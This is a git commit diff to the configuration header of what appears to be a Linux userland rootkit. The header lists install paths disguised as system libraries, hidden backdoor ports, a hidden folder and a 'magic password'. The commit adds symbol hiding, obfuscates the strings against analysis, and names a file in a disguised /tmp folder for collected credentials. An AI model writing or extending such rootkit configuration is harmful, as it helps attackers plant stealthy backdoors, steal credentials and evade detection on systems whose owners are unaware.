8854f3bb5c1c97ab54f9a0ebd45ab5f597ef0c06
demon-i386 <muranotatsuo@protonmail.com>
2023-02-16 03:42:03 -0300

    Update config.h

--- utils/config.h
+++ utils/config.h
@@ -1,12 +1,13 @@
-char* INSTALL_LOCATIONS[] = {
+__attribute__((visibility("hidden"))) char* INSTALL_LOCATIONS[] = {
 				AY_OBFUSCATE("/lib/libhtsjava.so.3"), 
-			  AY_OBFUSCATE("/lib/libsgx_urts.so.1.1"), 
+				AY_OBFUSCATE("/lib/libsgx_urts.so.1.1"), 
 				AY_OBFUSCATE("/lib/libogdi.so.4.1"), 
 				AY_OBFUSCATE("/lib64/ld-linux-x86-64.so.3"), 
 				AY_OBFUSCATE("/lib/selinux.so.1.1.2")
-			    };
-int HIDDEN_PORTS[]       = {1337, 1338};
-char* HIDDEN_FOLDERS[]    = {AY_OBFUSCATE("jakhid")};
-char* MAGIC_PASS          = "magicpass";
-char* HIDETAG_ENTRY       = "obfuscate_start";
-char* HIDETAG_STOP 		  = "obfuscate_stop";
+				};
+__attribute__((visibility("hidden"))) int HIDDEN_PORTS[]		= {1337, 1338};
+__attribute__((visibility("hidden"))) char* HIDDEN_FOLDERS[]	= {AY_OBFUSCATE("jakhid")};
+__attribute__((visibility("hidden"))) char* MAGIC_PASS			= AY_OBFUSCATE("magicpass");
+__attribute__((visibility("hidden"))) char* HIDETAG_ENTRY		= AY_OBFUSCATE("obfuscate_start");
+__attribute__((visibility("hidden"))) char* HIDETAG_STOP		= AY_OBFUSCATE("obfuscate_stop");
+__attribute__((visibility("hidden"))) char* CREDENTIALS_FILE	= AY_OBFUSCATE("/tmp/.X11-logs/creds");
